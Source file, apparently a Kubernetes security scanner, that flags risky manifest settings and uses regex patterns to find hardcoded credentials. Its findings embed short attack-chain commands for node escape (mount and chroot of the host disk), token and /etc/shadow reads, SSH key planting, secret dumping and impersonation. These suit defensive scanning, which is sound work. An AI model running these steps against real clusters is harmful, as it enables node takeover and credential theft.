#!/usr/bin/env python3
"""
SpotterSec v0.4.0 — Kubernetes Security Scanner
Find it. Understand it. Know how to exploit it.
https://spottersec.com
"""
from __future__ import annotations
import argparse, copy, difflib, json, math, os, re, sys, textwrap, time
import threading
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import yaml
from rich import box
from rich.console import Console
from rich.padding import Padding
from rich.panel import Panel
from rich.rule import Rule
from rich.syntax import Syntax
from rich.table import Table
from rich.text import Text
from rich.prompt import Confirm, Prompt

VERSION = "0.6.3"
console = Console()

# ─────────────────────────────────────────────────────────────
# DATA MODEL
# ─────────────────────────────────────────────────────────────
SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
SEV_WEIGHT = {"CRITICAL": 40, "HIGH": 15, "MEDIUM": 5, "LOW": 1}
SEV = {
    "CRITICAL": {"icon": "💀", "color": "bold red",    "bar": "red"},
    "HIGH":     {"icon": "🔴", "color": "bold yellow", "bar": "yellow"},
    "MEDIUM":   {"icon": "🟡", "color": "bold cyan",   "bar": "cyan"},
    "LOW":      {"icon": "🔵", "color": "dim white",   "bar": "white"},
}

@dataclass
class Finding:
    rule_id:      str
    severity:     str
    title:        str
    description:  str
    attack_chain: list[str]
    fix_snippet:  str
    scenario_url: str
    line_num:     Optional[int]     = None
    line_content: Optional[str]     = None
    context_lines: list            = field(default_factory=list)
    yaml_path:    str              = ""
    doc_index:    int              = 0
    resource_key: str              = ""   # "kind/namespace/name" for grouping


def _make_finding(rule_id, severity, title, description, attack_chain,
                  fix_snippet, scenario_url, raw_lines, pattern,
                  doc_start, doc_end, doc_idx, resource_key=""):
    line_num, line_content, context = None, None, []
    if pattern and raw_lines:
        for i, line in enumerate(raw_lines[doc_start:doc_end], start=doc_start+1):
            if pattern in line:
                line_num     = i
                line_content = line.rstrip()
                start = max(doc_start, i - 3)
                end   = min(doc_end,   i + 2)
                for j in range(start, end):
                    context.append((j+1, raw_lines[j].rstrip(), j+1 == i))
                break
    return Finding(
        rule_id=rule_id, severity=severity, title=title, description=description,
        attack_chain=attack_chain, fix_snippet=fix_snippet, scenario_url=scenario_url,
        line_num=line_num, line_content=line_content, context_lines=context,
        doc_index=doc_idx, resource_key=resource_key,
    )

SCENARIO_URL = {
    "privileged-pod":     "https://spottersec.com/#scenario/privileged-pod",
    "hostpath-escape":    "https://spottersec.com/#scenario/hostpath-escape",
    "dashboard-chain":    "https://spottersec.com/#scenario/dashboard-chain",
    "etcd-exposure":      "https://spottersec.com/#scenario/etcd-exposure",
    "ssrf-metadata":      "https://spottersec.com/#scenario/ssrf-metadata",
    "wildcard-rbac":      "https://spottersec.com/#scenario/wildcard-rbac",
    "supply-chain":       "https://spottersec.com/#scenario/supply-chain",
    "cloud-iam-pivot":    "https://spottersec.com/#scenario/cloud-iam-pivot",
    "secrets-exfil":      "https://spottersec.com/#scenario/secrets-exfil",
    "service-mesh-escape":"https://spottersec.com/#scenario/service-mesh-escape",
}

def S(name): return SCENARIO_URL.get(name, "")

# ─────────────────────────────────────────────────────────────
# MULTI-DOC YAML PARSER
# ─────────────────────────────────────────────────────────────
def _doc_boundaries(raw_lines):
    boundaries = []
    start = 0
    for i, line in enumerate(raw_lines):
        if line.rstrip() == "---" and i > 0:
            boundaries.append((start, i))
            start = i + 1
    boundaries.append((start, len(raw_lines)))
    return boundaries

def _resource_key(doc):
    if not isinstance(doc, dict):
        return ""
    kind = doc.get("kind", "?")
    # kubectl wraps multi-resource results in a List — use the items inside
    if kind in ("List", "PodList", "DeploymentList", "NodeList") or kind.endswith("List"):
        return ""  # handled by unwrapping in scan_yaml_string
    meta = doc.get("metadata", {}) or {}
    ns   = meta.get("namespace", "")
    name = meta.get("name", "")
    if not name:
        return kind
    return f"{kind}/{ns+'/' if ns else ''}{name}"

# ─────────────────────────────────────────────────────────────
# RULE CHECKERS
# ─────────────────────────────────────────────────────────────
_SAFE_VALUES_EXACT  = {"", "true", "false", "null", "none", "yes", "no",
                        "debug", "info", "warn", "warning", "error",
                        "production", "staging", "development",
                        "localhost", "0.0.0.0", "127.0.0.1",
                        "utf-8", "utf8", "json", "yaml", "xml", "csv",
                        "http", "https", "grpc"}
_SAFE_PREFIXES      = ["/var/log", "/tmp", "/app", "/home", "/usr",
                       "/etc/ssl", "/etc/ca", "file://", "s3://", "gs://",
                       "arn:aws", "projects/", "http://", "https://",
                       "0.", "1.", "2.", "3.", "8080", "8443", "443", "80",
                       "/dev/null"]
_CRED_KEYS = re.compile(
    r"(password|passwd|pwd|secret|token|api[_-]?key|access[_-]?key|"
    r"auth[_-]?key|private[_-]?key|credential|client[_-]?secret|"
    r"db[_-]?pass|database[_-]?pass|stripe[_-]?key|github[_-]?token|"
    r"slack[_-]?token|jwt[_-]?secret|encryption[_-]?key)",
    re.IGNORECASE,
)

def _looks_like_credential(name: str, value) -> bool:
    if not _CRED_KEYS.search(name):
        return False
    if not isinstance(value, str) or not value.strip():
        return False
    v = value.strip().lower()
    if v in _SAFE_VALUES_EXACT:
        return False
    if any(v.startswith(p.lower()) for p in _SAFE_PREFIXES):
        return False
    if len(value.strip()) < 4:
        return False
    return True


# ─────────────────────────────────────────────────────────────
# SECRET PATTERN DETECTION
# Matches on value content — catches real credentials regardless
# of key name. Much lower false positive rate than key-name heuristics.
# ─────────────────────────────────────────────────────────────
_SECRET_PATTERNS = [
    # AWS
    ("AWS Access Key ID",         "CRITICAL", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("AWS Secret Access Key",     "CRITICAL", re.compile(r"(?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])")),
    ("AWS Session Token",         "HIGH",     re.compile(r"FwoGZXIvYXdzE[A-Za-z0-9+/=]{100,}")),
    # GCP
    ("GCP OAuth Token",           "HIGH",     re.compile(r"ya29\.[0-9A-Za-z\-_]{68,}")),
    # GitHub
    ("GitHub Personal Token",     "CRITICAL", re.compile(r"ghp_[A-Za-z0-9]{35,}")),
    ("GitHub OAuth Token",        "CRITICAL", re.compile(r"gho_[A-Za-z0-9]{35,}")),
    ("GitHub Actions Token",      "CRITICAL", re.compile(r"ghs_[A-Za-z0-9]{35,}")),
    ("GitHub App Token",          "CRITICAL", re.compile(r"ghu_[A-Za-z0-9]{35,}")),
    ("GitHub Fine-grained Token", "CRITICAL", re.compile(r"github_pat_[A-Za-z0-9_]{80,}")),
    # Stripe
    ("Stripe Secret Key",         "CRITICAL", re.compile(r"sk_live_[0-9a-zA-Z]{24,}")),
    ("Stripe Restricted Key",     "HIGH",     re.compile(r"rk_live_[0-9a-zA-Z]{24,}")),
    # Slack
    ("Slack Bot Token",           "HIGH",     re.compile(r"xoxb-[0-9]+-[0-9]+-[A-Za-z0-9]+")),
    ("Slack User Token",          "HIGH",     re.compile(r"xoxp-[0-9]+-[0-9]+-[0-9]+-[A-Za-z0-9]+")),
    ("Slack Webhook",             "HIGH",     re.compile(r"https://hooks\.slack\.com/services/T[A-Za-z0-9_]{8}/B[A-Za-z0-9_]{8}/[A-Za-z0-9_]{24}")),
    # Private keys
    ("RSA Private Key",           "CRITICAL", re.compile(r"-----BEGIN RSA PRIVATE KEY-----")),
    ("EC Private Key",            "CRITICAL", re.compile(r"-----BEGIN EC PRIVATE KEY-----")),
    ("OpenSSH Private Key",       "CRITICAL", re.compile(r"-----BEGIN OPENSSH PRIVATE KEY-----")),
    ("PGP Private Key Block",     "CRITICAL", re.compile(r"-----BEGIN PGP PRIVATE KEY BLOCK-----")),
    ("Generic Private Key",       "CRITICAL", re.compile(r"-----BEGIN PRIVATE KEY-----")),
    # AI / LLM
    ("Anthropic API Key",         "HIGH",     re.compile(r"sk-ant-[A-Za-z0-9\-_]{32,}")),
    ("OpenAI API Key",            "HIGH",     re.compile(r"sk-[A-Za-z0-9]{48}")),
    # SaaS / infra tokens
    ("Twilio Auth Token",         "HIGH",     re.compile(r"\bSK[0-9a-fA-F]{32}\b")),
    ("SendGrid API Key",          "HIGH",     re.compile(r"SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}")),
    ("Hashicorp Vault Token",     "HIGH",     re.compile(r"hvs\.[A-Za-z0-9]{24,}")),
    ("npm Token",                 "HIGH",     re.compile(r"npm_[A-Za-z0-9]{36}")),
    ("PyPI Token",                "HIGH",     re.compile(r"pypi-[A-Za-z0-9\-_]{32,}")),
    ("Databricks Token",          "HIGH",     re.compile(r"\bdapi[a-f0-9]{32}\b")),
    # Database DSNs with embedded credentials
    ("Database DSN with password","HIGH",     re.compile(r"(?:postgres|postgresql|mysql|mongodb|mongodb\+srv|redis|amqp|rediss)://[^:@\s]+:[^@\s]{4,}@")),
    # Bearer tokens in values
    ("Bearer token",              "MEDIUM",   re.compile(r"\bBearer\s+[A-Za-z0-9\-_\.]{40,}")),
]

def _detect_secret_pattern(value: str):
    """
    Scan a string value for known secret patterns.
    Returns (pattern_name, severity) if matched, else None.
    Skips values that look like references, placeholders, or env var syntax.
    """
    if not isinstance(value, str) or len(value) < 8:
        return None
    v = value.strip()
    # Skip obvious non-secrets: references, placeholders, template syntax
    if v.startswith(("$(", "${", "vault:", "$(", "{{", "secretKeyRef", "configMapKeyRef")):
        return None
    if v.startswith("<") and v.endswith(">"):  # <placeholder>
        return None
    if v.startswith("$"):  # env var reference like $MY_SECRET
        return None
    for name, severity, pattern in _SECRET_PATTERNS:
        if pattern.search(v):
            return (name, severity)
    return None


def check_pod_spec(spec, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    if spec.get("hostPID"):
        findings.append(F("NS001","HIGH","hostPID: true — process namespace sharing",
            "hostPID mounts the host's PID namespace into the pod. Every process running on the node is visible "
            "and can be signalled from inside the container. Combined with SYS_PTRACE, an attacker can dump "
            "memory of any process on the node.",
            ["Attacker gets RCE in pod",
             "Runs ps aux — sees all host processes including kubelet, containerd, cloud agents",
             "Sends SIGKILL to critical processes → node disruption",
             "With SYS_PTRACE: attaches to process and dumps memory → credentials"],
            "spec:\n  hostPID: false",
            S("privileged-pod"), "hostPID: true"))

    if spec.get("hostNetwork"):
        findings.append(F("NS002","HIGH","hostNetwork: true — host network namespace",
            "The pod shares the host's network stack. It can bind to any port on the host, "
            "sniff traffic on the host NIC, and bypass NetworkPolicy (which operates on pod IPs).",
            ["Pod gets RCE",
             "Binds to port 443 on host IP — intercepts legitimate traffic",
             "Sniffs all unencrypted pod-to-pod traffic on the node",
             "NetworkPolicy does not apply — bypassed by design"],
            "spec:\n  hostNetwork: false",
            S("privileged-pod"), "hostNetwork: true"))

    if spec.get("hostIPC"):
        findings.append(F("NS003","MEDIUM","hostIPC: true — host IPC namespace",
            "Shares the host's IPC namespace. Attacker can read/write shared memory segments "
            "of other processes on the host — a rarely-needed capability with significant abuse potential.",
            ["Pod gets RCE",
             "Attaches to host IPC namespace",
             "Reads shared memory of other processes (e.g. database in-memory data)"],
            "spec:\n  hostIPC: false",
            S("privileged-pod"), "hostIPC: true"))

    if spec.get("automountServiceAccountToken", True):
        findings.append(F("SA001","MEDIUM","SA token auto-mounted — K8s API access from pod",
            "A service account token is automatically projected at /var/run/secrets/kubernetes.io/serviceaccount/token. "
            "Any RCE in the pod gives the attacker this token — enabling K8s API calls as the pod's service account. "
            "Most application pods do not need to call the K8s API.",
            ["Attacker gets RCE",
             "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
             "kubectl auth can-i --list --token=<token>",
             "Pivot to K8s API — read Secrets, create pods, or escalate depending on RBAC"],
            "spec:\n  automountServiceAccountToken: false",
            S("dashboard-chain"), "automountServiceAccountToken"))

    sa = spec.get("serviceAccountName", "default")
    if sa == "default":
        findings.append(F("SA002","MEDIUM","Uses 'default' ServiceAccount",
            "The pod runs as the 'default' ServiceAccount. In many clusters the default SA accumulates "
            "permissions from various RBAC bindings over time. Running as a dedicated SA with minimal "
            "permissions limits blast radius.",
            ["Attacker gets SA token from pod",
             "default SA has accumulated permissions from misconfigured RoleBindings",
             "Attacker exploits those permissions"],
            "spec:\n  serviceAccountName: myapp-sa  # create a dedicated SA",
            S("dashboard-chain"), "serviceAccountName: default"))

    for ckey in ("containers", "initContainers", "ephemeralContainers"):
        for c in spec.get(ckey, []):
            sc = c.get("securityContext", {}) or {}
            name = c.get("name", "?")

            if sc.get("privileged"):
                findings.append(F("SC001","CRITICAL",f"privileged: true [{name}]",
                    "privileged:true removes all Linux namespace isolation. The container can directly "
                    "access all host devices, load kernel modules, and perform any syscall. "
                    "Combined with a hostPath volume, this is a 2-command node escape.",
                    ["Attacker gets RCE in pod",
                     "fdisk -l — sees all host block devices",
                     "mount /dev/sda1 /mnt — mounts host root filesystem",
                     "chroot /mnt — attacker is now root on the node"],
                    f"# In container spec for '{name}':\nsecurityContext:\n  privileged: false\n  allowPrivilegeEscalation: false\n  capabilities:\n    drop: [\"ALL\"]",
                    S("privileged-pod"), "privileged: true"))

            if sc.get("runAsUser") == 0:
                findings.append(F("SC002","HIGH",f"runAsUser: 0 — explicit root [{name}]",
                    "The container is explicitly configured to run as root (UID 0). "
                    "If an attacker escapes the container, they are root on the host. "
                    "Most application workloads do not require root.",
                    ["Container runs as UID 0",
                     "File writes from container are owned by root",
                     "On container escape: attacker is root on host"],
                    f"securityContext:  # for '{name}'\n  runAsUser: 1000\n  runAsGroup: 1000\n  runAsNonRoot: true",
                    S("privileged-pod"), "runAsUser: 0"))

            if sc.get("runAsNonRoot") is False:
                findings.append(F("SC003","HIGH",f"runAsNonRoot: false [{name}]",
                    "runAsNonRoot:false explicitly permits the container to run as root. "
                    "This overrides any pod-level runAsNonRoot setting.",
                    ["Container may start as root even if image defaults to non-root",
                     "Privilege escalation easier from root context"],
                    f"securityContext:  # '{name}'\n  runAsNonRoot: true\n  runAsUser: 1000",
                    S("privileged-pod"), "runAsNonRoot: false"))

            if "runAsNonRoot" not in sc and sc.get("runAsUser", 1) != 0:
                findings.append(F("SC004","MEDIUM",f"runAsNonRoot not set [{name}]",
                    "runAsNonRoot is not set. Kubernetes will not enforce a non-root UID — "
                    "if the container image defaults to root, it will run as root silently.",
                    ["Image defaults to running as root",
                     "Kubernetes does not block it",
                     "Container runs as UID 0"],
                    f"securityContext:  # '{name}'\n  runAsNonRoot: true\n  runAsUser: 1000",
                    S("privileged-pod"), ""))

            if sc.get("allowPrivilegeEscalation") is True:
                findings.append(F("SC005","HIGH",f"allowPrivilegeEscalation: true [{name}]",
                    "Allows the process to gain more privileges than its parent. "
                    "Enables setuid binaries and kernel exploits that abuse privilege escalation paths.",
                    ["Attacker runs setuid binary inside container",
                     "Kernel escalation exploits apply"],
                    f"securityContext:  # '{name}'\n  allowPrivilegeEscalation: false",
                    S("privileged-pod"), "allowPrivilegeEscalation: true"))

            if "allowPrivilegeEscalation" not in sc and not sc.get("privileged"):
                findings.append(F("SC006","LOW",f"allowPrivilegeEscalation not set [{name}]",
                    "Defaults to true in Kubernetes. Should be explicitly set to false for all containers.",
                    ["Container may run setuid binaries",
                     "Default-true is a footgun"],
                    f"securityContext:  # '{name}'\n  allowPrivilegeEscalation: false",
                    S("privileged-pod"), ""))

            if not sc.get("readOnlyRootFilesystem"):
                findings.append(F("SC007","LOW",f"readOnlyRootFilesystem not set [{name}]",
                    "A writable root filesystem allows attackers to modify binaries, drop tools, "
                    "or write web shells after gaining RCE.",
                    ["Attacker gets RCE",
                     "Writes malicious binary to /usr/bin",
                     "Persists between restarts via shared volumes"],
                    f"securityContext:  # '{name}'\n  readOnlyRootFilesystem: true",
                    S("privileged-pod"), ""))

            if not sc.get("seccompProfile"):
                findings.append(F("SC008","LOW",f"No seccomp profile [{name}]",
                    "Without a seccomp profile, the container can make any Linux syscall. "
                    "Seccomp blocks dangerous syscalls (ptrace, unshare, keyctl) reducing kernel attack surface.",
                    ["Attacker in container calls ptrace()",
                     "Kernel exploit succeeds without seccomp restriction"],
                    f"securityContext:  # '{name}'\n  seccompProfile:\n    type: RuntimeDefault",
                    S("privileged-pod"), ""))

            DANGEROUS_CAPS = {
                "SYS_ADMIN":  ("CRITICAL","enables mounting, network config, kernel debug — equivalent to root"),
                "SYS_MODULE": ("CRITICAL","load arbitrary kernel modules — full host compromise"),
                "SYS_RAWIO":  ("CRITICAL","raw disk I/O — read/write any block device"),
                "SYS_PTRACE": ("CRITICAL","attach debugger to any process — memory dump, code injection"),
                "NET_ADMIN":  ("HIGH",    "modify network config, iptables, routing — bypass NetworkPolicy"),
                "DAC_OVERRIDE":("HIGH",   "bypass file permission checks — read any file"),
                "SETUID":     ("HIGH",    "change UID — impersonate any user"),
                "SETGID":     ("HIGH",    "change GID"),
                "NET_RAW":    ("MEDIUM",  "raw sockets — craft arbitrary packets, ARP spoofing"),
                "CHOWN":      ("MEDIUM",  "change file ownership — own any file on writable filesystem"),
                "FSETID":     ("MEDIUM",  "setuid bit on files — privilege escalation"),
                "KILL":       ("MEDIUM",  "send signals to any process"),
            }
            for cap in sc.get("capabilities", {}).get("add", []):
                cap_u = cap.upper()
                if cap_u in DANGEROUS_CAPS:
                    sev, why = DANGEROUS_CAPS[cap_u]
                    findings.append(F(f"CAP001_{cap_u}", sev,
                        f"Dangerous capability: {cap_u} [{name}]",
                        f"{cap_u} {why}.",
                        [f"Container gains {cap_u} capability",
                         "Exploits specific kernel surface this opens"],
                        f"securityContext:\n  capabilities:\n    drop: [\"ALL\"]\n    # Do NOT add: {cap_u}",
                        S("privileged-pod"), f"- {cap}"))

            caps = sc.get("capabilities", {})
            drop = [c.upper() for c in caps.get("drop", [])]
            if "ALL" not in drop:
                findings.append(F("CAP002","MEDIUM",f"capabilities.drop: [ALL] missing [{name}]",
                    "Capabilities are not explicitly dropped. Even without adding dangerous capabilities, "
                    "default capabilities include NET_BIND_SERVICE, SETUID, SETGID, and others.",
                    ["Container has default Linux capabilities",
                     "Subset of defaults are exploitable"],
                    f"securityContext:  # '{name}'\n  capabilities:\n    drop: [\"ALL\"]",
                    S("privileged-pod"), ""))

            if not c.get("resources", {}).get("limits"):
                findings.append(F("RES001","LOW",f"No resource limits [{name}]",
                    "Without resource limits, a compromised or buggy container can consume all CPU/memory "
                    "on the node — a denial of service for all other workloads.",
                    ["Container consumes unbounded CPU/memory",
                     "Node goes OOM — evicts other pods",
                     "Cluster instability"],
                    f"# '{name}':\nresources:\n  limits:\n    cpu: 500m\n    memory: 256Mi\n  requests:\n    cpu: 100m\n    memory: 128Mi",
                    S("dashboard-chain"), ""))

            image = c.get("image", "")
            tag_match = re.search(r":([^@\s/]+)$", image.split("/")[-1] if "/" in image else image)
            tag = tag_match.group(1) if tag_match else ""
            if "@sha256:" not in image and (not tag or tag == "latest"):
                findings.append(F("IMG001","LOW",f"Mutable image tag: {image or '(none)'} [{name}]",
                    "Image tags are mutable pointers — they can be overwritten by a registry push. "
                    "A supply chain attack can swap what :latest points to. "
                    "Pin to a digest (@sha256:...) for an immutable reference.",
                    ["Attacker compromises CI/CD or registry",
                     "Pushes malicious image to same tag",
                     "Next pod restart pulls poisoned image silently"],
                    f"image: {image.split(':')[0]}:v1.2.3@sha256:<digest>  # pin to digest",
                    S("supply-chain"), image if image else ""))

            # ENV credential check — key-name heuristic (ENV001)
            for env_entry in c.get("env", []):
                if not isinstance(env_entry, dict):
                    continue
                if "valueFrom" in env_entry:
                    continue
                env_name  = env_entry.get("name", "")
                env_value = env_entry.get("value", "")
                # Pattern-based detection (ENV003) — matches on value content
                pat_match = _detect_secret_pattern(str(env_value)) if env_value else None
                if pat_match:
                    pat_name, pat_sev = pat_match
                    masked = str(env_value)[:6] + "***" if len(str(env_value)) > 6 else "***"
                    findings.append(F("ENV003", pat_sev,
                        f"{pat_name} detected in env var: {env_name}={masked}",
                        f"The environment variable '{env_name}' contains what appears to be a real {pat_name}. "
                        "Hardcoded credentials in env vars are exposed via kubectl describe pod, "
                        "container introspection, /proc/*/environ, and log aggregation — all without "
                        "requiring Secrets access.",
                        ["Attacker with read access to pods: kubectl describe pod → env vars exposed",
                         "Attacker with pod exec: env → all env vars including this credential",
                         f"Credential type: {pat_name} — rotatable at the source before exploiting"],
                        f"# Replace with a Kubernetes Secret reference:\nenv:\n- name: {env_name}\n  valueFrom:\n    secretKeyRef:\n      name: my-app-secrets\n      key: {env_name.lower().replace('_','-')}\n---\n# Create the secret:\nkubectl create secret generic my-app-secrets \\\n  --from-literal={env_name.lower().replace('_','-')}='<value>'",
                        S("secrets-exfil"), f"name: {env_name}"))
                elif _looks_like_credential(env_name, env_value):
                    masked = str(env_value)[:4] + "***" if len(str(env_value)) > 4 else "***"
                    findings.append(F("ENV001","HIGH",
                        f"Hardcoded credential in env var: {env_name}={masked}",
                        f"The environment variable '{env_name}' appears to contain a hardcoded credential value. "
                        "Env vars are visible via the K8s API (kubectl describe pod), in container "
                        "introspection, process listings (/proc/*/environ), and in log aggregation tools — all "
                        "without requiring Secrets access.",
                        ["Attacker with read access to pods: kubectl describe pod → env vars exposed",
                         "Attacker with pod exec: env → all env vars including this credential",
                         "Cat /proc/1/environ from another container (if hostPID) → steals value",
                         "Log shipper captures env var on startup → credential in logs forever"],
                        f"# Replace with a Kubernetes Secret reference:\nenv:\n- name: {env_name}\n  valueFrom:\n    secretKeyRef:\n      name: my-app-secrets\n      key: {env_name.lower().replace('_','-')}\n---\n# Create the secret:\nkubectl create secret generic my-app-secrets \\\n  --from-literal={env_name.lower().replace('_','-')}='<value>'",
                        S("secrets-exfil"), f"name: {env_name}"))

    for vol in spec.get("volumes", []):
        path = vol.get("hostPath", {}).get("path", "")
        DANGEROUS_PATHS = {"/", "/etc", "/proc", "/sys", "/dev",
                           "/var/lib/kubelet", "/etc/kubernetes",
                           "/var/run/docker.sock", "/run/containerd"}
        if path and (path in DANGEROUS_PATHS or
                     any(path.startswith(dp+"/") for dp in DANGEROUS_PATHS)):
            findings.append(F("VOL001","CRITICAL",
                f"hostPath mount on dangerous path: {path}",
                f"The volume mounts '{path}' from the host filesystem into the container. "
                "This gives the container read/write access to critical host filesystem paths. "
                "Combined with root user or privileged:true, this is a direct node escape.",
                ["Pod mounts host path",
                 "Attacker reads /etc/shadow, /var/lib/kubelet/config.yaml, node kubeconfig",
                 "Writes authorized_keys to /root/.ssh — persistent SSH access to node",
                 "Or: modifies /etc/cron.d for persistent execution"],
                f"# Replace hostPath with emptyDir or a PersistentVolumeClaim:\nvolumes:\n- name: {vol.get('name','data')}\n  emptyDir: {{}}",
                S("hostpath-escape"), path))
    return findings


def check_rbac(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    kind = doc.get("kind", "")

    if kind in ("ClusterRoleBinding", "RoleBinding"):
        role_ref = doc.get("roleRef", {})
        role_name = role_ref.get("name", "")
        if role_name == "cluster-admin":
            for subj in doc.get("subjects", []):
                sname = subj.get("name", "?")
                findings.append(F("RBAC001","CRITICAL",
                    f"cluster-admin binding → {subj.get('kind','?')}/{sname}",
                    "cluster-admin grants full control over the entire cluster. "
                    "A compromised pod or user with this binding can read all secrets, "
                    "create privileged pods on any node, and modify RBAC.",
                    ["Attacker compromises subject with cluster-admin",
                     "kubectl get secrets -A — dumps all cluster secrets",
                     "Creates privileged pod to escape to node",
                     "Modifies RBAC to create backdoor access"],
                    "# Remove this binding. Use minimal Role + RoleBinding instead.",
                    S("dashboard-chain"), "cluster-admin"))

        if role_name in ("admin", "edit"):
            findings.append(F("RBAC005","HIGH",
                f"Binding to built-in '{role_name}' role",
                f"The built-in '{role_name}' role grants broad write access. "
                "Prefer a custom Role with only the specific verbs and resources needed.",
                ["Attacker gets subject credential",
                 f"Has '{role_name}' permissions — broad write access to namespace resources"],
                "# Create a custom Role with minimal permissions instead.",
                S("wildcard-rbac"), role_name))

    if kind in ("ClusterRole", "Role"):
        rules = doc.get("rules", []) or []
        has_wildcard_all = any(
            "*" in r.get("verbs", []) and "*" in r.get("resources", []) and "*" in r.get("apiGroups", [])
            for r in rules
        )
        if has_wildcard_all:
            findings.append(F("RBAC006","CRITICAL","ClusterRole with full wildcard (verbs:* resources:* apiGroups:*)",
                "This role grants every action on every resource in every API group — equivalent to cluster-admin.",
                ["Attacker gets subject token",
                 "Has full cluster control"],
                "# Remove wildcard rules. Enumerate exactly what's needed.",
                S("wildcard-rbac"), "verbs:\n  - '*'"))

        for rule in rules:
            verbs     = rule.get("verbs", [])
            resources = rule.get("resources", [])
            groups    = rule.get("apiGroups", [])

            DANGER_RESOURCES = {"pods", "deployments", "daemonsets", "statefulsets",
                                 "replicasets", "jobs", "cronjobs"}
            if "*" in verbs and any(r in DANGER_RESOURCES or r == "*" for r in resources):
                findings.append(F("RBAC002","HIGH","Wildcard verbs on pod/workload resources",
                    "Wildcard verbs include create, delete, patch, update. "
                    "On pod resources, this allows deploying privileged pods for node escape.",
                    ["Attacker exploits wildcard verbs",
                     "Creates privileged pod → node escape"],
                    "# Replace verbs:[*] with specific read-only verbs:\nverbs: [get, list, watch]",
                    S("wildcard-rbac"), "verbs:\n  - '*'"))

            if "*" in resources and "*" not in verbs:
                findings.append(F("RBAC003","HIGH","Wildcard resources in RBAC rule",
                    "Resource wildcard includes all current and future resource types. "
                    "This grants access to resources the author may not have intended.",
                    ["Future CRDs or resources automatically included in permission",
                     "Attacker accesses sensitive resources not anticipated at authoring time"],
                    "# Enumerate specific resources:\nresources: [pods, services]",
                    S("wildcard-rbac"), "resources:\n  - '*'"))

            if "secrets" in resources and any(v in verbs for v in ("get", "list", "watch", "*")):
                findings.append(F("RBAC004","HIGH","Role grants Secrets read access",
                    "Secrets read access exposes all secrets in scope — DB passwords, TLS keys, API tokens. "
                    "Prefer projected volumes to deliver specific secrets to pods "
                    "rather than granting role-level secret read.",
                    ["Attacker gets subject token",
                     "kubectl get secrets -n <ns> -o json → all namespace credentials"],
                    "# Remove secrets read. Use projected volumes for specific secrets.",
                    S("secrets-exfil"), "secrets"))

            POD_WRITE_VERBS = {"create", "update", "patch", "delete", "*"}
            if any(r in ("pods", "deployments", "daemonsets", "statefulsets", "*") for r in resources) \
               and any(v in POD_WRITE_VERBS for v in verbs):
                findings.append(F("RBAC007","HIGH","Role can create/modify pods — escalation path",
                    "Pod write access is an indirect privilege escalation. "
                    "An attacker can create a privileged pod with hostPath / and escape to the node.",
                    ["Attacker uses pod write permissions",
                     "Creates privileged pod: spec.hostPath=/, privileged:true",
                     "Pod scheduled → node escape"],
                    "# Restrict to read-only:\nverbs: [get, list, watch]",
                    S("wildcard-rbac"), ""))

            RBAC_RESOURCES = {"roles", "clusterroles", "rolebindings", "clusterrolebindings"}
            if any(r in RBAC_RESOURCES or r == "*" for r in resources) \
               and any(v in {"create","update","patch","delete","bind","escalate","*"} for v in verbs):
                findings.append(F("RBAC008","CRITICAL","Role can write RBAC — self-grant escalation",
                    "Writing RBAC resources allows escalation to any permission. "
                    "An attacker can create a ClusterRoleBinding to cluster-admin.",
                    ["Attacker uses RBAC write",
                     "Creates ClusterRoleBinding: subject=attacker, role=cluster-admin",
                     "Attacker has full cluster control"],
                    "# Never grant RBAC write access to application service accounts.",
                    S("wildcard-rbac"), ""))

            if "users" in resources or "groups" in resources or "serviceaccounts" in resources:
                if any(v in {"impersonate","*"} for v in verbs):
                    findings.append(F("RBAC009","CRITICAL","Role grants impersonation",
                        "Impersonation allows acting as any user or service account — "
                        "effectively bypassing all RBAC.",
                        ["Attacker uses impersonate permission",
                         "kubectl --as=system:masters ... — acts as cluster superuser"],
                        "# Never grant impersonation outside of dedicated proxy services.",
                        S("wildcard-rbac"), ""))

    return findings


def check_services(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
    def F(rule_id, severity, title, description, attack_chain, fix_snippet, scenario_url, pattern=""):
            return _make_finding(rule_id, severity, title, description, attack_chain,
                                 fix_snippet, scenario_url, raw_lines, pattern,
                                 doc_start, doc_end, doc_idx, rkey)
    spec = doc.get("spec", {}) or {}
    svc_type = spec.get("type", "ClusterIP")

    if svc_type == "LoadBalancer":
        findings.append(F("SVC001","MEDIUM","Service type LoadBalancer — public IP",
            "LoadBalancer allocates a public IP from the cloud provider. "
            "All ports exposed become reachable from the internet unless a firewall rule restricts them.",
            ["Service gets public IP",
             "Port exposed to internet",
             "Attacker probes service directly"],
            "spec:\n  type: ClusterIP  # use Ingress with TLS instead",
            S("dashboard-chain"), "type: LoadBalancer"))

    if spec.get("externalIPs"):
        findings.append(F("SVC002","HIGH","externalIPs set — CVE-2020-8554",
            "externalIPs enables a man-in-the-middle attack (CVE-2020-8554). "
            "An attacker with service creation rights sets an externalIP to intercept "
            "traffic destined for that IP.",
            ["Attacker creates/modifies service with externalIPs",
             "Traffic to that IP routed through attacker-controlled endpoint",
             "Credentials and session data intercepted"],
            "spec:\n  # Remove externalIPs entirely",
            S("ssrf-metadata"), "externalIPs"))

    if svc_type == "NodePort":
        findings.append(F("SVC003","LOW","Service type NodePort",
            "NodePort exposes the service on every node's IP at a static port (30000-32767). "
            "Depending on node security groups, this may be internet-accessible.",
            ["Node security group allows port 30000-32767",
             "Service accessible from internet"],
            "spec:\n  type: ClusterIP  # use Ingress instead",
            S("dashboard-chain"), "type: NodePort"))
    return findings


def check_etcd(doc, raw_lines, doc_start, doc_end, doc_idx, rkey):
    findings = []
